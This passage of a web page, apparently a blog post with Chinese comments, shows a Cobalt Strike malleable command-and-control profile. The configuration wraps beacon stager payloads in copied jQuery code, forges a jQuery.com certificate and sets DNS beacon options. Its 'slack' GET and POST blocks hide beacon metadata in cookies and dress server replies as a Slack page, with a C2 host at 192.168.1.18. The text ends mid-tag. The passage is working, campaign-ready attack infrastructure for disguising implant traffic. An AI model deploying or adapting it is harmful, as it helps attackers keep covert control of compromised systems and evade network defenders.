null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            # <span class="number">1</span>st Line</span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-stager &#123;  </span><br><span class="line">    # 控制分阶段下载payload的方式</span><br><span class="line">    <span class="built_in">set</span> uri_x86 <span class="string">&quot;/jquery-3.3.1.slim.min.js&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> uri_x64 <span class="string">&quot;/jquery-3.3.2.slim.min.js&quot;</span>;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            ## The javascript was changed.  Double quotes and backslashes were escaped to properly <span class="title function_">render</span> <span class="params">(Refer to Tips <span class="keyword">for</span> Profile Parameter Values)</span></span><br><span class="line">            # 2nd Line            </span><br><span class="line">            prepend &quot;!<span class="title function_">function</span><span class="params">(e,t)</span>&#123;\<span class="string">&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            # <span class="number">1</span>st Line</span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US,en;q=0.5&quot;</span>;</span><br><span class="line">        <span class="meta">#header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;code.jquery.com&quot;</span>;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https-certificate &#123;</span><br><span class="line">    </span><br><span class="line">    ## Option <span class="number">1</span>) Trusted and Signed Certificate</span><br><span class="line">    ## Use keytool to create a Java Keystore file. </span><br><span class="line">    ## Refer to https:<span class="comment">//www.cobaltstrike.com/help-malleable-c2#validssl</span></span><br><span class="line">    #<span class="meta"># or https:<span class="comment">//github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh</span></span></span><br><span class="line">   </span><br><span class="line">    ## Option <span class="number">2</span>) Create your own Self-Signed Certificate</span><br><span class="line">    ## Use keytool to import your own self <span class="type">signed</span> certificates</span><br><span class="line"></span><br><span class="line">    <span class="meta">#set keystore <span class="string">&quot;/pathtokeystore&quot;</span>;</span></span><br><span class="line">    <span class="meta">#set password <span class="string">&quot;password&quot;</span>;</span></span><br><span class="line"></span><br><span class="line">    ## Option <span class="number">3</span>) Cobalt Strike Self-Signed Certificate</span><br><span class="line">    <span class="built_in">set</span> C   <span class="string">&quot;US&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> CN  <span class="string">&quot;jquery.com&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> O   <span class="string">&quot;jQuery&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> OU  <span class="string">&quot;Certificate Authority&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> validity <span class="string">&quot;365&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dns-beacon &#123;</span><br><span class="line">    # Options moved into <span class="string">&quot;dns-beacon&quot;</span> group in version <span class="number">4.3</span></span><br><span class="line">    <span class="built_in">set</span> dns_idle           <span class="string">&quot;74.125.196.113&quot;</span>; <span class="meta">#google.com (change this to match your campaign)</span></span><br><span class="line">    <span class="built_in">set</span> dns_max_txt        <span class="string">&quot;252&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_sleep          <span class="string">&quot;0&quot;</span>; #    Force a sleep prior to each individual DNS request. (in milliseconds)</span><br><span class="line">    <span class="built_in">set</span> dns_ttl            <span class="string">&quot;5&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> maxdns             <span class="string">&quot;255&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_prepend <span class="string">&quot;.resources.123456.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_subhost <span class="string">&quot;.feeds.123456.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    # DNS subhosts override options, added in version <span class="number">4.3</span></span><br><span class="line">    <span class="built_in">set</span> beacon           <span class="string">&quot;a.bc.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_A            <span class="string">&quot;b.1a.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_AAAA         <span class="string">&quot;c.4a.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_TXT          <span class="string">&quot;d.tx.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_metadata     <span class="string">&quot;e.md.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_output       <span class="string">&quot;f.po.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> ns_response      <span class="string">&quot;zero&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-get <span class="string">&quot;slack&quot;</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># get请求的uri</span></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/messages/H4j8yG&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;192.168.1.18&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            </span><br><span class="line">    base64;</span><br><span class="line">    append <span class="string">&quot;;_ga=GA1.2.875&quot;</span>;</span><br><span class="line">    append <span class="string">&quot;;__ar_v4=%8867UMDGS643&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;d=&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;_ga=GA1.2.875;&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;b=.12vPkW22o;&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html; charset=utf-8&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-XSS-Protection&quot;</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Strict-Transport-Security&quot;</span> <span class="string">&quot;max-age=66674; includeSubDomains; preload&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Referrer-Policy&quot;</span> <span class="string">&quot;no-referrer&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Slack-Backend&quot;</span> <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;private, no-cache, no-store, must-revalidate&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Frame-Options&quot;</span> <span class="string">&quot;SAMEORIGIN&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Via&quot;</span> <span class="string">&quot;haproxy-www-w6k7&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">base64;</span><br><span class="line">prepend <span class="string">&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=\&quot;en-US\&quot; class=\&quot;supports_custom_scrollbar\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=\&quot;utf-8\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;meta http-equiv=\&quot;X-UA-Compatible\&quot; content=\&quot;IE=edge,chrome=1\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;meta name=\&quot;referrer\&quot; content=\&quot;no-referrer\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;meta name=\&quot;superfish\&quot; content=\&quot;nofish\&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Microsoft Developer Chat Slack&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;meta name=\&quot;author\&quot; content=\&quot;Slack\&quot;&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&lt;link rel=\&quot;dns-prefetch\&quot; href=\&quot;https://a.slack-edge.com?id=&quot;</span>;</span><br><span class="line">    append <span class="string">&quot;\&quot;&gt; &lt;/script&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    append <span class="string">&quot;&lt;div id=\&quot;client-ui\&quot; class=\&quot;container-fluid sidebar_theme_\&quot;\&quot;\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;div id=\&quot;banner\&quot; class=\&quot;hidden\&quot; role=\&quot;complementary\&quot; aria-labelledby=\&quot;notifications_banner_aria_label\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;h1 id=\&quot;notifications_banner_aria_label\&quot; class=\&quot;offscreen\&quot;&gt;Notifications Banner&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;div id=\&quot;notifications_banner\&quot; class=\&quot;banner sk_fill_blue_bg hidden\&quot;&gt;</span></span><br><span class="line"><span class="string">    Slack needs your permission to &lt;button type=\&quot;button\&quot; class=\&quot;btn_link\&quot;&gt;enable desktop notifications&lt;/button&gt;.        &lt;button type=\&quot;button\&quot; class=\&quot;btn_unstyle banner_dismiss ts_icon ts_icon_times_circle\&quot; data-action=\&quot;dismiss_banner\&quot; aria-label=\&quot;Dismiss\&quot;&gt;&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div id=\&quot;notifications_dismiss_banner\&quot; class=\&quot;banner seafoam_green_bg hidden\&quot;&gt;</span></span><br><span class="line"><span class="string">    We strongly recommend enabling desktop notifications if you’ll be using Slack on this computer.        &lt;span class=\&quot;inline_block no_wrap\&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;button type=\&quot;button\&quot; class=\&quot;btn_link\&quot; onclick=\&quot;TS.ui.banner.close(); TS.ui.banner.growlsPermissionPrompt();\&quot;&gt;Enable notifications&lt;/button&gt; •</span></span><br><span class="line"><span class="string">        &lt;button type=\&quot;button\&quot; class=\&quot;btn_link\&quot; onclick=\&quot;TS.ui.banner.close()\&quot;&gt;Ask me next time&lt;/button&gt; •</span></span><br><span class="line"><span class="string">        &lt;button type=\&quot;button\&quot; class=\&quot;btn_link\&quot; onclick=\&quot;TS.ui.banner.closeNagAndSetCookie()\&quot;&gt;Never ask again on this computer&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/span&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;&quot;</span>;</span><br><span class="line">print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post <span class="string">&quot;slack&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/messages/oYVDqI&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;192.168.1.18&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">    base64;</span><br><span class="line">    append <span class="string">&quot;;_ga=GA1.2.875&quot;</span>;</span><br><span class="line">    append <span class="string">&quot;__ar_v4=%8867UMDGS643&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;d=&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;_ga=GA1.2.875;&quot;</span>;</span><br><span class="line">    prepend <span class="string">&quot;b=.12vPkW22o;&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        id &#123;</span><br><span class="line">            </span><br><span class="line">    base64;</span><br><span class="line">    prepend <span class="string">&quot;GA1.&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;_ga&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/json; charset=utf-8&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Strict-Transport-Security&quot;</span> <span class="string">&quot;max-age=66674; includeSubDomains; preload&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Referrer-Policy&quot;</span> <span class="string">&quot;no-referrer&quot;</span>;</span><br><span class="line">    header <span 